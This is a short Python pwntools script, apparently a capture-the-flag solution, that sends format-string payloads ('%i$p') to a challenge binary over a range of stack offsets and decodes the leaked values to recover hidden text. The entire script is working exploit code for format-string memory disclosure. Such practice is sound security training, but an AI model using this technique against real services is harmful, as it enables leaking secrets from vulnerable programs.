from pwn import *

elf = context.binary = ELF("./chall")

for i in range(100):
    # p = remote("elia.challs.pascalctf.it", 1339)  # Only use remote, no need for process()
    p = process()
    p.sendline(f"%{i}$p")
    p.recvuntil(b'Wow, it actually compiled! Do you want to write something?\n')
    
    leaked_data = p.recvline().strip()
    
    if leaked_data == b"(nil)":
        print(f"{i}: (nil)")
    else:
        try:
            decoded_str = bytes.fromhex(leaked_data.decode()[2:]).decode("utf-8")[::-1]  # Reverse endianness
            print(f"{i}: {decoded_str}")
        except:
            print(f"{i}: {leaked_data.decode()} (raw)")
    
    p.close()
